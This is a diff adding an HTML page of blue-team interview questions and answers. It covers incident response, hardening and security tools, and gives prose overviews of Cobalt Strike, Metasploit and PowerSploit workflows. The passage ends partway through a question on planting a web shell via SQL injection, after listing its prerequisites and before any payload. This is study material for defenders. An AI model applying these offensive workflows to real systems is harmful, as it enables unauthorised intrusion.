@@ -1,0 +1,343 @@
+<!doctype html>
+<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-questions/blue-team/operational-depth" data-has-hydrated="false">
+<head>
+<meta charset="UTF-8">
+<meta name="generator" content="Docusaurus v3.10.1">
+<title data-rh="true">Operational Depth for Blue Teams | Cybersecurity Interview Questions</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:url" content="https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Operational Depth for Blue Teams | Cybersecurity Interview Questions"><meta data-rh="true" name="description" content="---"><meta data-rh="true" property="og:description" content="---"><link data-rh="true" rel="icon" href="/cybersecurity-interview-questions/img/logo.svg"><link data-rh="true" rel="canonical" href="https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth"><link data-rh="true" rel="alternate" href="https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth" hreflang="en"><link data-rh="true" rel="alternate" href="https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth" hreflang="x-default"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Questions","item":"https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/"},{"@type":"ListItem","position":2,"name":"Blue Team","item":"https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/"},{"@type":"ListItem","position":3,"name":"Operational Depth for Blue Teams","item":"https://excalibra.github.io/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth"}]}</script><script defer="defer" src="https://cloud.umami.is/script.js" data-website-id="03e4dc18-2dfd-496e-a937-725a016e3312"></script><link rel="stylesheet" href="/cybersecurity-interview-questions/assets/css/styles.717376c8.css">
+<script src="/cybersecurity-interview-questions/assets/js/runtime~main.7532378c.js" defer="defer"></script>
+<script src="/cybersecurity-interview-questions/assets/js/main.a9142131.js" defer="defer"></script>
+</head>
+<body>
+<svg style="display: none;"><defs>
+<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
+</defs></svg>
+<script>!function(){var t=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",t||"light"),document.documentElement.setAttribute("data-theme-choice",t||"light")}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/cybersecurity-interview-questions/"><div class="navbar__logo"><img src="/cybersecurity-interview-questions/img/logo.svg" alt="Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/cybersecurity-interview-questions/img/logo.svg" alt="Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">Cybersecurity Interview Questions</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/cybersecurity-interview-questions/docs/">Docs</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/Excalibra/cybersecurity-interview-questions" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-label="(opens in new tab)" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="Switch between dark and light mode (currently system mode)"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><div class="navbar__search searchBarContainer_NW3z" dir="ltr"><input placeholder="Search" aria-label="Search" class="navbar__search-input" value=""><div class="loadingRing_RJI3 searchBarLoadingRing_YnHq"><div></div><div></div><div></div><div></div></div></div></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/cybersecurity-interview-questions/docs/"><span title="Overview" class="linkLabel_WmDU">Overview</span></a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" href="/cybersecurity-interview-questions/docs/questions/"><span title="Questions" class="categoryLinkLabel_W154">Questions</span></a><button aria-label="Collapse sidebar category &#x27;Questions&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/red-team/"><span title="Red Team" class="categoryLinkLabel_W154">Red Team</span></a><button aria-label="Expand sidebar category &#x27;Red Team&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/red-team-interview-experience/"><span title="Red Team Interview Experience" class="categoryLinkLabel_W154">Red Team Interview Experience</span></a><button aria-label="Expand sidebar category &#x27;Red Team Interview Experience&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/red-team-interview-questions-two-sets/"><span title="Red Team Interview Experience (Two Sets)" class="categoryLinkLabel_W154">Red Team Interview Experience (Two Sets)</span></a><button aria-label="Expand sidebar category &#x27;Red Team Interview Experience (Two Sets)&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/network-security-interview/important-protocol-stack-overview"><span title="Network Security" class="categoryLinkLabel_W154">Network Security</span></a><button aria-label="Expand sidebar category &#x27;Network Security&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist menu__link--active" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/"><span title="Blue Team" class="categoryLinkLabel_W154">Blue Team</span></a><button aria-label="Collapse sidebar category &#x27;Blue Team&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/incident-response-macro"><span title="Incident Response – Macro Questions" class="linkLabel_WmDU">Incident Response – Macro Questions</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/incident-response-details"><span title="Incident Response – Detail Questions" class="linkLabel_WmDU">Incident Response – Detail Questions</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/intrusion-detection-and-prevention"><span title="Intrusion Detection &amp; Prevention" class="linkLabel_WmDU">Intrusion Detection &amp; Prevention</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/traceability"><span title="Traceability &amp; Forensics" class="linkLabel_WmDU">Traceability &amp; Forensics</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/other-topics"><span title="Other Topics" class="linkLabel_WmDU">Other Topics</span></a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/cybersecurity-interview-questions/docs/questions/blue-team/operational-depth"><span title="Operational Depth for Blue Teams" class="linkLabel_WmDU">Operational Depth for Blue Teams</span></a></li></ul></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="categoryLink_byQd menu__link menu__link--sublist" href="/cybersecurity-interview-questions/docs/topics/"><span title="Topics" class="categoryLinkLabel_W154">Topics</span></a><button aria-label="Expand sidebar category &#x27;Topics&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/cybersecurity-interview-questions/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/cybersecurity-interview-questions/docs/questions/"><span>Questions</span></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/cybersecurity-interview-questions/docs/questions/blue-team/"><span>Blue Team</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">Operational Depth for Blue Teams</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Operational Depth for Blue Teams</h1></header>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-how-do-you-handle-false-positives-from-security-devices">Q: How do you handle false positives from security devices?<a href="#q-how-do-you-handle-false-positives-from-security-devices" class="hash-link" aria-label="Direct link to Q: How do you handle false positives from security devices?" title="Direct link to Q: How do you handle false positives from security devices?" translate="no">​</a></h2>
+<p><strong>A:</strong> False positives from external sources typically indicate a need for device policy tuning and do not require immediate action. For internal false positives, you should:</p>
+<ol>
+<li class="">Consult with the responsible team to determine the root cause.</li>
+<li class="">Add exceptions or whitelist rules if the traffic is confirmed to be legitimate.</li>
+<li class="">Document the decision for future reference.</li>
+</ol>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-how-do-you-distinguish-between-scanning-traffic-and-manual-attack-traffic">Q: How do you distinguish between scanning traffic and manual attack traffic?<a href="#q-how-do-you-distinguish-between-scanning-traffic-and-manual-attack-traffic" class="hash-link" aria-label="Direct link to Q: How do you distinguish between scanning traffic and manual attack traffic?" title="Direct link to Q: How do you distinguish between scanning traffic and manual attack traffic?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>Scanning traffic:</strong> Large volume, regular patterns, high frequency, and often contains tool‑specific signatures (e.g., in User‑Agent, headers, or payloads). Tools like AWVS, Nessus, and AppScan leave identifiable fingerprints in request URLs, headers, or body.</li>
+<li class=""><strong>Manual traffic:</strong> Smaller volume, irregular intervals, and less predictable patterns.</li>
+</ul>
+<p>You can use Wireshark filters (e.g., <code>http contains &quot;xxx&quot;</code>) to search for keywords and identify anomalous patterns.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-the-process-if-a-website-is-found-to-have-a-web-shell">Q: What is the process if a website is found to have a web shell?<a href="#q-what-is-the-process-if-a-website-is-found-to-have-a-web-shell" class="hash-link" aria-label="Direct link to Q: What is the process if a website is found to have a web shell?" title="Direct link to Q: What is the process if a website is found to have a web shell?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ol>
+<li class=""><strong>Isolate the site:</strong> Take the website offline and, if necessary, disconnect the server from the network.</li>
+<li class=""><strong>Combine manual and automated detection:</strong>
+<ul>
+<li class="">Use tools like D‑Shield Web Shell Killer, ShellPub, or online scanners to scan web directories.</li>
+<li class="">Compare against a known‑good backup to identify new or modified files.</li>
+</ul>
+</li>
+<li class=""><strong>Remediate:</strong> Remove malicious files and restore from clean backups if possible.</li>
+<li class=""><strong>Strengthen security:</strong> Regularly back up configuration files, apply patches, update components, enforce strong passwords, and monitor for anomalies.</li>
+</ol>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-how-would-you-analyse-a-large-log-file">Q: How would you analyse a large log file?<a href="#q-how-would-you-analyse-a-large-log-file" class="hash-link" aria-label="Direct link to Q: How would you analyse a large log file?" title="Direct link to Q: How would you analyse a large log file?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>Signature matching:</strong> Use regular expressions to detect known attack patterns.</li>
+<li class=""><strong>Statistical analysis:</strong> Identify requests that occur significantly less often than the average.</li>
+<li class=""><strong>Whitelist approach:</strong> Establish a baseline of normal requests and flag anything outside it.</li>
+<li class=""><strong>Machine learning (HMM):</strong> Automatically model normal behaviour and flag deviations.</li>
+<li class=""><strong>Use log analysis tools:</strong> LogForensics, Graylog, Nagios, or the ELK Stack (Elasticsearch, Logstash, Kibana).</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-are-some-common-enterprise-collaboration-platforms-oa-systems-that-are-often-targeted">Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?<a href="#q-what-are-some-common-enterprise-collaboration-platforms-oa-systems-that-are-often-targeted" class="hash-link" aria-label="Direct link to Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?" title="Direct link to Q: What are some common enterprise collaboration platforms (OA systems) that are often targeted?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>PHP‑based:</strong> Tongda OA, WeOffice Eoffice.</li>
+<li class=""><strong>Java‑based:</strong> WeOffice OA/Cloud Bridge, Zhiyuan OA, Lanling OA, Yongyou OA.</li>
+<li class=""><strong>ASP‑based:</strong> Qilai OA.</li>
+</ul>
+<p>These are commonly used in enterprise environments and are frequent targets for attackers.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-can-you-describe-common-security-devices-and-their-functions">Q: Can you describe common security devices and their functions?<a href="#q-can-you-describe-common-security-devices-and-their-functions" class="hash-link" aria-label="Direct link to Q: Can you describe common security devices and their functions?" title="Direct link to Q: Can you describe common security devices and their functions?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>IPS (Intrusion Prevention System):</strong> Monitors network traffic and actively blocks or modifies malicious activity.</li>
+<li class=""><strong>IDS (Intrusion Detection System):</strong> Passively monitors and alerts on suspicious activity.</li>
+<li class=""><strong>Firewall:</strong> Enforces access control policies between networks with different trust levels.</li>
+<li class=""><strong>Database Audit System:</strong> Captures and analyses database access traffic to detect and log unauthorised queries.</li>
+<li class=""><strong>Log Audit System:</strong> Collects, stores, and analyses logs from various sources for security monitoring and compliance.</li>
+<li class=""><strong>Bastion Host (Jump Server):</strong> Centralised access control and audit for administrative users.</li>
+<li class=""><strong>Vulnerability Scanner:</strong> Identifies security weaknesses in systems and applications.</li>
+<li class=""><strong>Security Situational Awareness Platform:</strong> Aggregates and correlates security data to provide a holistic view of the environment.</li>
+<li class=""><strong>Endpoint Security Management:</strong> Combines antivirus, access control, and EDR capabilities.</li>
+<li class=""><strong>WAF (Web Application Firewall):</strong> Inspects HTTP/HTTPS traffic to block web attacks.</li>
+<li class=""><strong>Honeypot:</strong> A decoy system designed to attract and detect attackers.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-are-the-key-areas-of-system-hardening">Q: What are the key areas of system hardening?<a href="#q-what-are-the-key-areas-of-system-hardening" class="hash-link" aria-label="Direct link to Q: What are the key areas of system hardening?" title="Direct link to Q: What are the key areas of system hardening?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<p><strong>Account Security:</strong></p>
+<ul>
+<li class=""><strong>Windows:</strong> Disable guest accounts, enforce account lockout policies, and restrict remote logins.</li>
+<li class=""><strong>Linux:</strong> Lock unnecessary accounts (<code>passwd -l</code>), restrict <code>sudo</code> usage, and configure login failure limits (<code>faillog</code>).</li>
+</ul>
+<p><strong>Password Security:</strong></p>
+<ul>
+<li class=""><strong>Windows:</strong> Enforce complexity (uppercase, lowercase, digits, specials), minimum length, and password history.</li>
+<li class=""><strong>Linux:</strong> Check for empty passwords in <code>/etc/shadow</code>, set password expiration via <code>/etc/login.defs</code>.</li>
+</ul>
+<p><strong>Service &amp; Port Management:</strong></p>
+<ul>
+<li class="">Close or restrict high‑risk ports (e.g., SSH 22, Telnet 23, RDP 3389).</li>
+<li class="">Use firewalls (e.g., <code>iptables</code>) to block or limit access.</li>
+</ul>
+<p><strong>File Permissions:</strong></p>
+<ul>
+<li class="">Set appropriate permissions (<code>chmod</code>) and use <code>chattr</code> to make critical files immutable.</li>
+</ul>
+<p><strong>Logging &amp; Auditing:</strong></p>
+<ul>
+<li class="">Configure system logging (<code>/var/log/messages</code>, <code>/var/log/secure</code>, etc.) and forward logs to a central server.</li>
+</ul>
+<p><strong>Network Controls:</strong></p>
+<ul>
+<li class="">Disable unnecessary protocols (e.g., ICMP echo), restrict USB devices, and prevent users from modifying IP settings.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-security-tools-have-you-used">Q: What security tools have you used?<a href="#q-what-security-tools-have-you-used" class="hash-link" aria-label="Direct link to Q: What security tools have you used?" title="Direct link to Q: What security tools have you used?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>SIEM/SOC:</strong> OSSIM (open source).</li>
+<li class=""><strong>IPS:</strong> Snort, Security Onion.</li>
+<li class=""><strong>Firewalls:</strong> TinyWall, ClearOS, or commercial endpoint protection.</li>
+<li class=""><strong>WAF:</strong> ModSecurity, Website Security Dog, or Baota.</li>
+<li class=""><strong>Threat Intelligence:</strong> MISP, OpenCTI.</li>
+<li class=""><strong>Vulnerability Scanning:</strong> OpenVAS, AWVS, Nessus.</li>
+<li class=""><strong>Bastion Host:</strong> JumpServer (can manage Windows hosts).</li>
+<li class=""><strong>Honeypot:</strong> T‑Pot, HFish.</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-cobalt-strike-and-how-is-it-used">Q: What is Cobalt Strike and how is it used?<a href="#q-what-is-cobalt-strike-and-how-is-it-used" class="hash-link" aria-label="Direct link to Q: What is Cobalt Strike and how is it used?" title="Direct link to Q: What is Cobalt Strike and how is it used?" translate="no">​</a></h2>
+<p><strong>A:</strong> Cobalt Strike is a commercial penetration testing tool used for adversary simulation and post‑exploitation. It operates in a client‑server model, allowing multiple operators to collaborate.</p>
+<p><strong>Common use cases:</strong></p>
+<ul>
+<li class="">Creating listeners to receive reverse shells.</li>
+<li class="">Generating payloads (e.g., Windows executables, Office macros, HTML applications).</li>
+<li class="">Conducting phishing campaigns and lateral movement.</li>
+</ul>
+<p><strong>Basic workflow:</strong></p>
+<ol>
+<li class="">Start the server and connect with the client.</li>
+<li class="">Set up a listener (IP/port).</li>
+<li class="">Generate a payload and deliver it to the target.</li>
+<li class="">When executed, the target connects back, establishing a session.</li>
+</ol>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-a-waf-and-how-does-it-work">Q: What is a WAF and how does it work?<a href="#q-what-is-a-waf-and-how-does-it-work" class="hash-link" aria-label="Direct link to Q: What is a WAF and how does it work?" title="Direct link to Q: What is a WAF and how does it work?" translate="no">​</a></h2>
+<p><strong>A:</strong> A Web Application Firewall protects web applications by filtering and monitoring HTTP/HTTPS traffic. It can be deployed in various forms:</p>
+<ul>
+<li class=""><strong>Non‑embedded:</strong> Hardware appliances, cloud‑based, or virtual appliances.</li>
+<li class=""><strong>Embedded:</strong> Modules within web servers (e.g., Apache mod_security) or code‑level filters.</li>
+</ul>
+<p><strong>How it works:</strong> WAFs apply rule sets to inspect requests for malicious patterns (SQL injection, XSS, etc.) and take actions such as blocking, logging, or alerting.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-are-you-familiar-with-powershell">Q: Are you familiar with PowerShell?<a href="#q-are-you-familiar-with-powershell" class="hash-link" aria-label="Direct link to Q: Are you familiar with PowerShell?" title="Direct link to Q: Are you familiar with PowerShell?" translate="no">​</a></h2>
+<p><strong>A:</strong> PowerShell is a task automation and configuration management framework from Microsoft. It is widely used for system administration and security tasks.</p>
+<p><strong>Common commands:</strong> <code>pwd</code>, <code>ls</code>, <code>cd</code>, <code>mkdir</code>, <code>rm</code>, <code>Get-Process</code>, <code>Get-Date</code>, <code>Get-Host</code>.</p>
+<p>In a security context, frameworks like PowerSploit leverage PowerShell for post‑exploitation, including information gathering, privilege escalation, and persistence.</p>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-is-metasploit-framework-msf-and-how-is-it-used">Q: What is Metasploit Framework (MSF) and how is it used?<a href="#q-what-is-metasploit-framework-msf-and-how-is-it-used" class="hash-link" aria-label="Direct link to Q: What is Metasploit Framework (MSF) and how is it used?" title="Direct link to Q: What is Metasploit Framework (MSF) and how is it used?" translate="no">​</a></h2>
+<p><strong>A:</strong> Metasploit is an open‑source penetration testing framework that provides tools for reconnaissance, vulnerability detection, exploitation, and post‑exploitation.</p>
+<p><strong>Key modules:</strong></p>
+<ul>
+<li class=""><strong>Auxiliary:</strong> Scanning, sniffing, and fingerprinting.</li>
+<li class=""><strong>Exploits:</strong> Code that leverages vulnerabilities to gain access.</li>
+<li class=""><strong>Payloads:</strong> Code to execute on the target (e.g., reverse shells).</li>
+<li class=""><strong>Post:</strong> Actions after successful exploitation (e.g., privilege escalation, data exfiltration).</li>
+<li class=""><strong>Encoders:</strong> Obfuscate payloads to evade detection.</li>
+</ul>
+<p><strong>Typical workflow:</strong></p>
+<ol>
+<li class="">Use auxiliary modules to discover vulnerabilities.</li>
+<li class="">Select an exploit and set the appropriate payload.</li>
+<li class="">Configure local listener settings.</li>
+<li class="">Execute the exploit; if successful, a session is created for further actions.</li>
+</ol>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-what-xss-platforms-have-you-used">Q: What XSS platforms have you used?<a href="#q-what-xss-platforms-have-you-used" class="hash-link" aria-label="Direct link to Q: What XSS platforms have you used?" title="Direct link to Q: What XSS platforms have you used?" translate="no">​</a></h2>
+<p><strong>A:</strong></p>
+<ul>
+<li class=""><strong>BlueLotus XSS</strong> (from the Blue-Lotus team).</li>
+<li class=""><strong>xss‑platform</strong> (open source).</li>
+<li class=""><strong>BeEF</strong> (Browser Exploitation Framework) – included in Kali Linux.</li>
+<li class=""><strong>Postman</strong> (for manual testing and payload crafting).</li>
+</ul>
+<hr>
+<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="q-how-can-you-write-a-web-shell-via-sql-injection">Q: How can you write a web shell via SQL injection?<a href="#q-how-can-you-write-a-web-shell-via-sql-injection" class="hash-link" aria-label="Direct link to Q: How can you write a web shell via SQL injection?" title="Direct link to Q: How can you write a web shell via SQL injection?" translate="no">​</a></h2>
+<p><strong>A:</strong> Writing a web shell requires:</p>
+<ul>
+<li class="">Knowledge of the web root path.</li>
+<li class="">File write permissions (usually requires <code>FILE</code> privilege in MySQL).</li>
+<li class="">The <code>secure_file_priv</code> setting not being restrictive.</li>
+</ul>
+<p><strong>Common methods:</strong></p>
+<ul>
+<li class=""><strong>Union + into outfile:</strong>
